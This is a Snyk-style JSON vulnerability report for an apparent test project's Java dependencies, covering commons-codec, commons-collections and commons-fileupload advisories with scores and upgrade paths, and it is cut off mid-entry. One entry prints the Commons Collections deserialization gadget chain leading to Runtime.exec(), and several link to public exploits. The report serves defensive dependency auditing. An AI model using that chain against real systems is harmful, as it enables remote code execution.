{
  "vulnerabilities": [
    {
      "id": "SNYK-JAVA-COMMONSCODEC-561518",
      "title": "Information Exposure",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "credit": [
        "Hanson Char"
      ],
      "semver": {
        "vulnerable": [
          "[,1.13)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.13"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "low",
      "cvssScore": 3.7,
      "functions": [
        {
          "version": [
            "[1.5,1.13)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base32.java",
            "className": "Base32",
            "functionName": "decode"
          }
        },
        {
          "version": [
            "[,1.13)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base64.java",
            "className": "Base64",
            "functionName": "decode"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-codec:commons-codec",
      "references": [
        {
          "url": "https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/CODEC-134",
          "title": "Jira Issue"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.\n\nAffected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.\n## Remediation\nUpgrade `commons-codec:commons-codec` to version 1.13 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)\n- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-200"
        ]
      },
      "packageName": "commons-codec:commons-codec",
      "proprietary": false,
      "creationTime": "2020-03-30T17:22:24.164713Z",
      "functions_new": [
        {
          "version": [
            "[1.5,1.13)"
          ],
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base32",
            "functionName": "decode"
          }
        },
        {
          "version": [
            "[,1.13)"
          ],
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base64",
            "functionName": "decode"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2020-03-30T17:20:23Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-codec",
        "artifactId": "commons-codec"
      },
      "publicationTime": "2012-03-03T17:20:25Z",
      "modificationTime": "2020-06-12T14:37:04.472432Z",
      "socialTrendAlert": false,
      "severityWithCritical": "low",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
        "commons-httpclient:commons-httpclient@3.1",
        "commons-codec:commons-codec@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "org.owasp.antisamy:antisamy@1.5.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-codec:commons-codec",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSCOLLECTIONS-30078",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[3.0,3.2.2)"
        ]
      },
      "exploit": "High",
      "fixedIn": [
        "3.2.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "critical",
      "cvssScore": 9.8,
      "functions": [
        {
          "version": [
            "[3,3.2.2)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/collections/functors/InvokerTransformer.java",
            "className": "InvokerTransformer",
            "functionName": "transform"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-collections:commons-collections",
      "references": [
        {
          "url": "http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/",
          "title": "FoxGloveSecurity Blog"
        },
        {
          "url": "https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/COLLECTIONS-580",
          "title": "Jira Issue"
        },
        {
          "url": "https://github.com/ianxtianxt/CVE-2015-7501",
          "title": "PoC"
        },
        {
          "url": "https://www.exploit-db.com/exploits/46628",
          "title": "Exploit DB"
        },
        {
          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
          "title": "CISA - Known Exploited Vulnerabilities"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-01-03T17:44:31.237189Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:24:31.709730Z"
        }
      ],
      "description": "## Overview\n\n[commons-collections:commons-collections](https://mvnrepository.com/artifact/commons-collections/commons-collections) is a library which contains types that extend and augment the Java Collections Framework.\n\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data.\nIt is possible to execute arbitrary Java code with the `InvokerTransformer` serializable collections . The `sun.reflect.annotation.AnnotationInvocationHandler#readObject` method invokes `#entrySet` and `#get` on a deserialized collection. If an attacker has to ability to send serialized data (JMX, RMI, EJB) to an application using the `common-collections` library, it is possible to combine the aforementioned methods to execute arbitrary code on the application.\r\n\r\n*Note:* `org.apache.commons:commons-collections` is no longer supported and has been moved to `org.apache.commons:commons-collections4` we recommend moving to the new artifact if possible.\n\n## Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\r\n\r\n  \r\n\r\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\r\n\r\n  \r\n\r\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\r\n\r\n  \r\n\r\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\r\n\r\n  \r\n\r\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\r\n\r\n- Apache Blog\r\n\r\n  \r\n\r\nThe vulnerability, also know as _Mad Gadget_\r\n\r\n> Mad Gadget is one of the most pernicious vulnerabilities we’ve seen. By merely existing on the Java classpath, seven “gadget” classes in Apache Commons Collections (versions 3.0, 3.1, 3.2, 3.2.1, and 4.0) make object deserialization for the entire JVM process Turing complete with an exec function. Since many business applications use object deserialization to send messages across the network, it would be like hiring a bank teller who was trained to hand over all the money in the vault if asked to do so politely, and then entrusting that teller with the key. The only thing that would keep a bank safe in such a circumstance is that most people wouldn’t consider asking such a question.\r\n\r\n- Google\n\n## Remediation\n\nUpgrade `commons-collections:commons-collections` to version 3.2.2 or higher.\n\n\n## References\n\n- [FoxGloveSecurity Blog](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)\n\n- [GitHub Commit](https://github.com/apache/commons-collections/commit/e585cd0433ae4cfbc56e58572b9869bd0c86b611)\n\n- [Jira Issue](https://issues.apache.org/jira/browse/COLLECTIONS-580)\n\n- [PoC](https://github.com/ianxtianxt/CVE-2015-7501)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/46628)\n\n- [CISA - Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n",
      "epssDetails": {
        "percentile": "0.81082",
        "probability": "0.00958",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2015-7501",
          "CVE-2015-4852"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "commons-collections:commons-collections",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:56Z",
      "functions_new": [
        {
          "version": [
            "[3,3.2.2)"
          ],
          "functionId": {
            "className": "org.apache.commons.collections.functors.InvokerTransformer",
            "functionName": "transform"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2015-11-06T16:51:56Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-collections",
        "artifactId": "commons-collections"
      },
      "publicationTime": "2015-11-06T16:51:56Z",
      "modificationTime": "2023-05-26T04:33:37.114758Z",
      "socialTrendAlert": false,
      "severityWithCritical": "critical",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-collections:commons-collections@3.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1",
        "commons-collections:commons-collections@3.2.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-collections:commons-collections",
      "version": "3.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSCOLLECTIONS-472711",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:R",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,3.2.2)"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.2.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.6,
      "functions": [
        {
          "version": [
            "[3.1, 3.22)",
            "[,3.0-dev2)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/collections/functors/InvokerTransformer.java",
            "className": "InvokerTransformer",
            "functionName": "<init>"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-collections:commons-collections",
      "references": [
        {
          "url": "https://github.com/apache/commons-collections/commit/5ec476b0b756852db865b2e442180f091f8209ee",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/commons-collections/pull/18",
          "title": "GitHub PR"
        },
        {
          "url": "https://issues.apache.org/jira/browse/COLLECTIONS-580",
          "title": "Jira Ticket"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:24:22.441391Z"
        }
      ],
      "description": "## Overview\n\n[commons-collections:commons-collections](https://mvnrepository.com/artifact/commons-collections/commons-collections) is a library which contains types that extend and augment the Java Collections Framework.\n\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data.\nVersions of commons-collections prior to `3.2.2` do not prevent deserialization of the class `org.apache.commons.collections.functors.InvokerTransformer`. This could be leveraged by an attacker as a gadget within a vulnerable application which deserializes user input to execute arbitrary code. \r\n\r\nVersions of commons-collections from 3.2.2 onwards will  throw an `UnsupportedOperationException` error when attempts are made to deserialize InvokerTransformer instances to prevent potential remote code execution exploits.\r\n\r\n*Note:* `org.apache.commons:commons-collections` is no longer supported and has been moved to `org.apache.commons:commons-collections4` we recommend moving to the new artifact if possible.\r\n\r\n## PoC \r\n\r\n```\r\n/*\r\n\tGadget chain:\r\n\t\tObjectInputStream.readObject()\r\n\t\t\tAnnotationInvocationHandler.readObject()\r\n\t\t\t\tMap(Proxy).entrySet()\r\n\t\t\t\t\tAnnotationInvocationHandler.invoke()\r\n\t\t\t\t\t\tLazyMap.get()\r\n\t\t\t\t\t\t\tChainedTransformer.transform()\r\n\t\t\t\t\t\t\t\tConstantTransformer.transform()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tClass.getMethod()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()\r\n\t\t\t\t\t\t\t\tInvokerTransformer.transform()\r\n\t\t\t\t\t\t\t\t\tMethod.invoke()\r\n\t\t\t\t\t\t\t\t\t\tRuntime.exec()\r\n\tRequires:\r\n\t\tcommons-collections\r\n */\r\n```\n\n## Details\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\r\n\r\n  \r\n\r\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\r\n\r\n  \r\n\r\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\r\n\r\n  \r\n\r\nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\r\n\r\n  \r\n\r\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\r\n\r\n- Apache Blog\r\n\r\n  \r\n\r\nThe vulnerability, also know as _Mad Gadget_\r\n\r\n> Mad Gadget is one of the most pernicious vulnerabilities we’ve seen. By merely existing on the Java classpath, seven “gadget” classes in Apache Commons Collections (versions 3.0, 3.1, 3.2, 3.2.1, and 4.0) make object deserialization for the entire JVM process Turing complete with an exec function. Since many business applications use object deserialization to send messages across the network, it would be like hiring a bank teller who was trained to hand over all the money in the vault if asked to do so politely, and then entrusting that teller with the key. The only thing that would keep a bank safe in such a circumstance is that most people wouldn’t consider asking such a question.\r\n\r\n- Google\n\n\n## Remediation\n\nUpgrade `commons-collections:commons-collections` to version 3.2.2 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/apache/commons-collections/commit/5ec476b0b756852db865b2e442180f091f8209ee)\n\n- [GitHub PR](https://github.com/apache/commons-collections/pull/18)\n\n- [Jira Ticket](https://issues.apache.org/jira/browse/COLLECTIONS-580)\n",
      "epssDetails": {
        "percentile": "0.80223",
        "probability": "0.00880",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2015-6420"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6hgm-866r-3cjv"
        ]
      },
      "packageName": "commons-collections:commons-collections",
      "proprietary": false,
      "creationTime": "2019-10-10T18:31:03.943542Z",
      "functions_new": [
        {
          "version": [
            "[3.1, 3.22)",
            "[,3.0-dev2)"
          ],
          "functionId": {
            "className": "org.apache.commons.collections.functors.InvokerTransformer",
            "functionName": "<init>"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2019-10-10T00:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-collections",
        "artifactId": "commons-collections"
      },
      "publicationTime": "2020-02-24T00:00:00Z",
      "modificationTime": "2023-02-09T11:24:22.441391Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-collections:commons-collections@3.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1",
        "commons-collections:commons-collections@3.2.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-collections:commons-collections",
      "version": "3.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30079",
      "title": "Time of Check Time of Use (TOCTOU)",
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
      "credit": [
        "Karl Dyszynski",
        "Hugo Vazquez Carames"
      ],
      "semver": {
        "vulnerable": [
          "[,1.3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "http://mail-archives.apache.org/mod_mbox/commons-user/201303.mbox/%3C51371C31.8020805@apache.org%3E",
          "title": "Commons-user Mailing List"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml%23L114",
          "title": "Github ChangeLog"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/7d9e956627a3803c1fc5734e2b18113a033e6f60",
          "title": "GitHub Commit"
        },
        {
          "url": "https://bugzilla.redhat.com/CVE-2013-0248",
          "title": "Redhat Bugzilla"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
          "cvssV3BaseScore": 4.4,
          "modificationTime": "2023-02-09T11:23:34.128649Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 3.1,
          "modificationTime": "2023-03-26T23:16:15.823645Z"
        }
      ],
      "description": "## Overview\n[commons-fileupload:commons-fileupload](https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload) is a component that provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\n\nAffected versions of this package are vulnerable to Time of Check Time of Use (TOCTOU) if the attacker has write access to the /tmp directory.\r\n\r\n## Details\r\nCommons FileUpload provides file upload capability for Servlets and web applications. During the upload process, FileUpload may (depending on configuration) save the uploaded file temporarily on disk. By default this will be in the system wide tmp directory. Because the temporary files have predictable file names and are stored in a publicly writeable location they are vulnerable to a TOCTOU attack.\r\n\r\nA successful attack requires that the attacker has write access to the tmp directory. The attack can be prevented by setting the repository to a non-publicly writeable location. The documentation for FileUpload does not highlight the potential security implications of not setting a repository, nor do the provided examples set a repository. This may have caused users to use FileUpload in an insecure manner.\n## Remediation\nUpgrade `commons-fileupload:commons-fileupload` to version 1.3 or higher.\n## References\n- [Commons-user Mailing List](http://mail-archives.apache.org/mod_mbox/commons-user/201303.mbox/%3C51371C31.8020805@apache.org%3E)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/b1498c9877d751f8bc4635a6f252ebdfcba28518/src/changes/changes.xml#L114)\n- [GitHub Commit](https://github.com/apache/commons-fileupload/commit/7d9e956627a3803c1fc5734e2b18113a033e6f60)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/CVE-2013-0248)\n",
      "epssDetails": {
        "percentile": "0.05680",
        "probability": "0.00042",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2013-0248"
        ],
        "CWE": [
          "CWE-264"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:47Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2013-03-15T20:55:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2015-05-06T16:51:47Z",
      "modificationTime": "2023-03-26T23:16:15.823645Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1",
        "commons-fileupload:commons-fileupload@1.3.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30080",
      "title": "Arbitrary File Write",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.1)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.3.1"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "https://github.com/apache/commons-fileupload/commit/163a6061fbc077d4b6e4787d26857c2baba495d1",
          "title": "GitHub Commit"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2186",
          "title": "RedHat Bugzilla Bug"
        },
        {
          "url": "https://access.redhat.com/security/cve/CVE-2013-2186",
          "title": "RedHat CVE Database"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:24:47.974398Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-04-01T14:50:20.293418Z"
        }
      ],
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nAffected versions of this package are vulnerable to Arbitrary File Write.\n\n## Details\nThe DiskFileItem class in Apache Commons FileUpload, as used in Red Hat JBoss BRMS 5.3.1; JBoss Portal 4.3 CP07, 5.2.2, and 6.0.0; and Red Hat JBoss Web Server 1.0.2 allows remote attackers to write to arbitrary files via a NULL byte in a file name in a serialized instance.\n\n## References\n- [Redhat Security Advisory](https://access.redhat.com/security/cve/CVE-2013-2186)\n- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2186)\n",
      "epssDetails": {
        "percentile": "0.88946",
        "probability": "0.02681",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2013-2186"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:48Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2013-06-16T16:51:48Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2013-06-16T16:51:48Z",
      "modificationTime": "2023-04-01T14:50:20.293418Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "commons-fileupload:commons-fileupload@1.2"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1",
        "commons-fileupload:commons-fileupload@1.3.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.2"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-30081",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:F",
      "credit": [
        "Mark Thomas"
      ],
      "semver": {
        "vulnerable": [
          "[,1.3.1)"
        ]
      },
      "exploit": "Functional",
      "fixedIn": [
        "1.3.1"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "http://mail-archives.apache.org/mod_mbox/www-announce/201402.mbox/%3C52F373FC.9030907@apache.org%3E",
          "title": "Apache Mailing list archives"
        },
        {
          "url": "http://svn.apache.org/viewvc?view=revision&revision=1565143",
          "title": "Apache-SVN"
        },
        {
          "url": "https://www.exploit-db.com/exploits/31615",
          "title": "Exploit DB"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml%23L90",
          "title": "Github ChangeLog"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/c61ff05b3241cb14d989b67209e57aa71540417a",
          "title": "GitHub Commit"
        },
        {
          "url": "http://struts.apache.org/docs/s2-020.html",
          "title": "Issue documentation"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0050",
          "title": "NVD"
        },
        {
          "url": "http://blog.spiderlabs.com/2014/02/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries.html",
          "title": "Oren Hafif Blog"
        },
        {
          "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries/",
          "title": "POC: Potential Exploit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:23:35.776405Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-02-09T11:24:59.734247Z"
        }
      ],
      "description": "## Overview\n[`commons-fileupload:commons-fileupload`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22commons-fileupload%22)\nAffected versions of this package are vulnerable to Denial of Service (DoS) attacks. An attacker may send a specially crafted `Content-Type` header that bypasses a loop's intended exit conditions, causing an infinite loop and high CPU consumption.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\r\n\r\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\r\n\r\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\r\n\r\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\r\n\r\nTwo common types of DoS vulnerabilities:\r\n\r\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\r\n\r\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)\n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0050)\n- [Github ChangeLog](https://github.com/apache/commons-fileupload/blob/master/src/changes/changes.xml#L90)\n- [Oren Hafif Blog](http://blog.spiderlabs.com/2014/02/cve-2014-0050-exploit-with-boundaries-loops-without-boundaries.html)\n- [Apache-SVN](http://svn.apache.org/viewvc?view=revision&revision=1565143)\n- [Apache Mailing list archives](http://mail-archives.apache.org/mod_mbox/www-announce/201402.mbox/%3C52F373FC.9030907@apache.org%3E)\n- [Issue documentation](http://struts.apache.org/docs/s2-020.html)\n",
      "epssDetails": {
        "percentile": "0.95131",
        "probability": "0.15701",
        "modelVersion": "v2023.03.01"
      },
